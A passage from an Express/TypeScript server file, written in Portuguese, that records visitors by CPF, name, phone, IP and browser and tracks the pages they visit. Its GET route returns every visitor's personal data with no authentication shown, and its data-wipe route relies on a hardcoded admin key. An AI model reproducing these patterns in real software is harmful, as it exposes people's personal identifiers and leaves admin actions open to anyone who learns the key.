          nome: req.body.nome || visitanteExistente.nome,
          telefone: req.body.telefone || visitanteExistente.telefone,
          ip: req.body.ip || visitanteExistente.ip
        });
        
        return res.json({
          id: visitanteExistente.id,
          cpf: visitanteExistente.cpf,
          message: 'Visitante atualizado com sucesso'
        });
      } else {
        // Criar um novo visitante
        const novoVisitante = await storage.createVisitante({
          cpf: cpf,
          nome: req.body.nome || null,
          telefone: req.body.telefone || null,
          ip: req.body.ip || null,
          navegador: req.body.navegador || null,
          sistema_operacional: req.body.sistema_operacional || null
        });
        
        return res.status(201).json({
          id: novoVisitante.id,
          cpf: novoVisitante.cpf,
          message: 'Visitante registrado com sucesso'
        });
      }
    } catch (error) {
      console.error('Erro ao registrar visitante:', error);
      return res.status(500).json({ error: 'Erro interno do servidor' });
    }
  });
  
  // Rota para registrar página visitada
  app.post('/api/rastreamento/pagina', async (req: Request, res: Response) => {
    try {
      // Validar os dados do corpo da requisição
      const validationResult = insertPaginaVisitadaSchema.safeParse(req.body);
      
      if (!validationResult.success) {
        return res.status(400).json({ 
          error: 'Dados inválidos', 
          details: validationResult.error.errors 
        });
      }
      
      // Verificar se o visitante existe
      const visitanteId = req.body.visitante_id;
      const visitante = await storage.getVisitante(visitanteId);
      
      if (!visitante) {
        return res.status(404).json({ error: 'Visitante não encontrado' });
      }
      
      // Registrar a página visitada
      const paginaVisitada = await storage.registrarPaginaVisitada({
        visitante_id: visitanteId,
        url: req.body.url,
        pagina: req.body.pagina,
        referrer: req.body.referrer || null,
        dispositivo: req.body.dispositivo || null
      });
      
      // Atualizar o último acesso do visitante
      await storage.updateVisitante(visitanteId, {
        ultimo_acesso: new Date()
      });
      
      return res.status(201).json({
        id: paginaVisitada.id,
        visitante_id: paginaVisitada.visitante_id,
        pagina: paginaVisitada.pagina,
        message: 'Página visitada registrada com sucesso'
      });
    } catch (error) {
      console.error('Erro ao registrar página visitada:', error);
      return res.status(500).json({ error: 'Erro interno do servidor' });
    }
  });
  
  // Rota para obter todos os visitantes
  app.get('/api/rastreamento/visitantes', async (req: Request, res: Response) => {
    try {
      const visitantes = await storage.getAllVisitantes();
      return res.json(visitantes);
    } catch (error) {
      console.error('Erro ao obter visitantes:', error);
      return res.status(500).json({ error: 'Erro interno do servidor' });
    }
  });
  
  // Rota para obter páginas visitadas por um visitante
  app.get('/api/rastreamento/visitante/:id/paginas', async (req: Request, res: Response) => {
    try {
      const visitanteId = parseInt(req.params.id);
      
      if (isNaN(visitanteId)) {
        return res.status(400).json({ error: 'ID de visitante inválido' });
      }
      
      // Verificar se o visitante existe
      const visitante = await storage.getVisitante(visitanteId);
      
      if (!visitante) {
        return res.status(404).json({ error: 'Visitante não encontrado' });
      }
      
      const paginasVisitadas = await storage.getPaginasVisitadasByVisitanteId(visitanteId);
      return res.json(paginasVisitadas);
    } catch (error) {
      console.error('Erro ao obter páginas visitadas:', error);
      return res.status(500).json({ error: 'Erro interno do servidor' });
    }
  });
  
  // Rota para obter estatísticas de visualizações por página
  app.get('/api/rastreamento/estatisticas/paginas', async (req: Request, res: Response) => {
    try {
      const estatisticas = await storage.getVisualizacoesPorPagina();
      return res.json(estatisticas);
    } catch (error) {
      console.error('Erro ao obter estatísticas:', error);
      return res.status(500).json({ error: 'Erro interno do servidor' });
    }
  });
  
  // Rota para limpar o banco de dados (protegida por chave de acesso)
  app.post('/api/admin/limpar-dados', async (req: Request, res: Response) => {
    try {
      // Verificar se a chave de acesso está correta
      const { accessKey } = req.body;
      
      // Chave de acesso fixa para proteção básica
      // Em um ambiente de produção, usar um sistema mais robusto
      const ADMIN_ACCESS_KEY = 'for4energy_admin_2025';

      if (accessKey !== ADMIN_ACCESS_KEY) {
        return res.status(401).json({ 
          error: 'Acesso não autorizado', 
          message: 'Chave de acesso inválida' 
        });
      }
      
      // Limpar dados do banco - usando queries diretas para essa funcionalidade específica
      await db.delete(paginas_visitadas);
      await db.delete(visitantes);
      
      return res.status(200).json({ 
        success: true, 
        message: 'Banco de dados limpo com sucesso' 
      });
    } catch (error) {
      console.error('Erro ao limpar banco de dados:', error);
      return res.status(500).json({ error: 'Erro interno do servidor' });
    }
  });
  
  // Criação do servidor HTTP para o Express
  const server = createServer(app);
  return server;
}